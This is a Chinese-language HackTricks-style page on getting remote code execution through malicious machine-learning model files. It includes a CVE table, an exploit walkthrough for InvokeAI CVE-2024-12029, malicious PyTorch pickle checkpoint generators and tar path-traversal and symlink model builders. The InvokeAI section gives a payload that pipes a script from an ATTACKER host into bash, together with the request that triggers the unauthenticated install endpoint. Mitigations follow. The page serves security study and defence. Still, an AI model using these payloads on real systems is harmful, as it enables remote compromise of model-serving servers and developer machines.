# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

机器学习模型通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。这些模型可以加载到开发者的机器或生产系统中使用。通常情况下，模型不应包含恶意代码，但在某些情况下，模型可以被用来在系统上执行任意代码，作为预期功能或由于模型加载库中的漏洞。

在撰写时，这里有一些此类漏洞的示例：

| **框架 / 工具**            | **漏洞 (如果有 CVE)**                                                                                                         | **RCE 向量**                                                                                                                         | **参考**                                   |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *不安全的反序列化在* `torch.load` **(CVE-2025-32434)**                                                              | 恶意 pickle 在模型检查点中导致代码执行（绕过 `weights_only` 保护）                                                                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 恶意模型下载导致代码执行；管理 API 中的 Java 反序列化 RCE                                                                      | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (不安全的 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | 从 YAML 加载模型使用 `yaml.unsafe_load`（代码执行） <br> 使用 **Lambda** 层加载模型运行任意 Python 代码                              | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 解析)                                                                                          | 精心制作的 `.tflite` 模型触发整数溢出 → 堆损坏（潜在 RCE）                                                                              | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | 通过 `joblib.load` 加载模型执行攻击者的 `__reduce__` 负载                                                                           | |
| **NumPy** (Python)          | **CVE-2019-6446** (不安全的 `np.load`) *有争议*                                                                              | `numpy.load` 默认允许 pickle 对象数组 – 恶意的 `.npy/.npz` 触发代码执行                                                              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (目录遍历) <br> **CVE-2024-5187** (tar 遍历)                                                    | ONNX 模型的外部权重路径可以逃逸目录（读取任意文件） <br> 恶意 ONNX 模型 tar 可以覆盖任意文件（导致 RCE）                               | |
| ONNX Runtime (设计风险)  | *(无 CVE)* ONNX 自定义操作 / 控制流                                                                                    | 带有自定义操作符的模型需要加载攻击者的本地代码；复杂的模型图滥用逻辑以执行意外计算                                                      | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (路径遍历)                                                                                          | 使用启用 `--model-control` 的模型加载 API 允许相对路径遍历以写入文件（例如，覆盖 `.bashrc` 以实现 RCE）                               | |
| **GGML (GGUF 格式)**      | **CVE-2024-25664 … 25668** (多个堆溢出)                                                                         | 格式错误的 GGUF 模型文件导致解析器中的堆缓冲区溢出，使得在受害者系统上执行任意代码                                                      | |
| **Keras (旧格式)**   | *(无新 CVE)* 旧版 Keras H5 模型                                                                                         | 恶意 HDF5 (`.h5`) 模型中的 Lambda 层代码在加载时仍然执行（Keras safe_mode 不涵盖旧格式 – “降级攻击”）                                   | |
| **其他** (一般)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式，Python `pickle.load`）将在未缓解的情况下执行嵌入模型文件中的任意代码                     | |

此外，还有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果不使用 `weights_only=True` 加载，则可能被用来在系统上执行任意代码。因此，任何基于 pickle 的模型可能特别容易受到此类攻击，即使它们未在上表中列出。

### 🆕  通过 `torch.load` 调用 InvokeAI RCE (CVE-2024-12029)

`InvokeAI` 是一个流行的开源 Stable-Diffusion 网络界面。版本 **5.3.1 – 5.4.2** 暴露了 REST 端点 `/api/v2/models/install`，允许用户从任意 URL 下载和加载模型。

内部该端点最终调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法在 **反序列化** 期间执行，导致 **远程代码执行 (RCE)** 在 InvokeAI 服务器上。

该漏洞被分配为 **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %)。

#### 利用过程

1. 创建一个恶意 checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 在您控制的 HTTP 服务器上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发易受攻击的端点（不需要身份验证）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载文件时，它调用 `torch.load()` → `os.system` 小工具运行，攻击者在 InvokeAI 进程的上下文中获得代码执行权限。

现成的利用：**Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 自动化整个流程。

#### 条件

•  InvokeAI 5.3.1-5.4.2（扫描标志默认 **false**）
•  `/api/v2/models/install` 可被攻击者访问
•  进程具有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 补丁默认将 `scan=True`，并在反序列化之前执行恶意软件扫描。
* 在程序中加载检查点时使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 辅助工具。
* 强制执行模型源的允许列表/签名，并以最小权限运行服务。

> ⚠️ 请记住，**任何** 基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）从不受信任的来源反序列化本质上是不安全的。

---

如果您必须保持旧版 InvokeAI 在反向代理后运行的临时缓解措施示例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## 示例 – 创建恶意的 PyTorch 模型

- 创建模型：
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型：
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

正如在[**这篇博客文章**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)中所述，不同AI框架使用的大多数模型格式基于归档，通常是`.zip`。因此，可能可以利用这些格式执行路径遍历攻击，从而允许读取加载模型的系统中的任意文件。

例如，使用以下代码，您可以创建一个模型，当加载时将在`/tmp`目录中创建一个文件：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用以下代码，您可以创建一个模型，当加载时会创建一个指向 `/tmp` 目录的符号链接：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## 参考文献

- [OffSec 博客 – "CVE-2024-12029 – InvokeAI 不受信任数据的反序列化"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI 补丁提交 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit 模块文档](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – torch.load 的安全考虑](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
